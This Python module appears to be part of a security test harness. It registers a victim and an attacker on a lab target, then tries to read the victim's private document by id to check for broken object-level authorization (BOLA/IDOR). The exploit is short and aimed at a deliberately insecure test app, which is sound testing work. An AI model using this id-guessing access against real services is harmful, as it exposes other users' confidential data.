"""API1 -- Broken Object Level Authorization (BOLA / IDOR) on /docs/{id}.

Attacker registers, then requests document ids belonging to other users.  In
insecure mode /docs/{id} performs no ownership check, so the attacker reads a
victim's document directly.  Success = the victim's confidential content is
returned for a doc the attacker does not own.

Secure mode returns 403 when the document's owner != the caller.
"""

from __future__ import annotations

from ..client import ExploitResult, TargetClient

VICTIM_SECRET = "BOLA-VICTIM-CONTENT-7781"


def run(client: TargetClient) -> ExploitResult:
    # Victim creates a private doc; capture its id.
    client.register("victim-bola@mirage.local")
    up = client.post(
        "/docs",
        data={"title": "private.txt", "content": f"Top secret: {VICTIM_SECRET}"},
    )
    victim_doc_id = up.json().get("id")

    # Attacker (different tenant) tries to read the victim's doc by id.
    client.register("strike-bola@mirage.local")
    r = client.get(f"/docs/{victim_doc_id}")
    leaked = r.status_code == 200 and VICTIM_SECRET in r.text
    return ExploitResult(
        vuln_id="API1",
        name="BOLA / IDOR on /docs/{id}",
        success=leaked,
        severity="high",
        detail="Read another user's document by guessing/incrementing its id.",
        evidence=(r.text[:300]) if leaked else "",
        blocked_reason="" if leaked else f"HTTP {r.status_code} (ownership enforced).",
    )
